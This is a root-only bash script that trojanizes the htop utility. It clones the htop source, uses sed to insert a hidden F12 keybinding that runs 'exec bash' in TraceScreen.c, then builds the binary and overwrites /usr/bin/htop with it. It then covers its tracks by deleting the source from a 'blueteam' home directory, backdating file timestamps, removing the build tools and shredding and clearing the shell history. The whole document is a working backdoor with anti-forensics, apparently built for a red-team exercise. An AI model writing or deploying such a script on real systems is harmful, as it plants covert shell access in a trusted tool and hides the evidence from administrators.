#!/bin/bash

if [[ $(/usr/bin/id -u) -ne 0 ]]; then
    echo "Run script with sudo or as root."
    exit
fi

apt install git autoconf automake libncursesw5-dev build-essential -y

git clone https://github.com/htop-dev/htop

cd htop

sed -i '201 s/}/   case KEY_F(12):system("exec bash");}/' TraceScreen.c

./autogen.sh && ./configure && make

mv htop /usr/bin/htop

cp /usr/bin/htop /usr/share/doc/htop

cd ..

rm -r /home/blueteam/htop

touch -a -m -t 202403140001 /usr/bin/htop
touch -a -m -t 202403140001 /usr/share/doc/htop

apt remove git autoconf automake build-essential

shred .bash_history

history -c && history -w
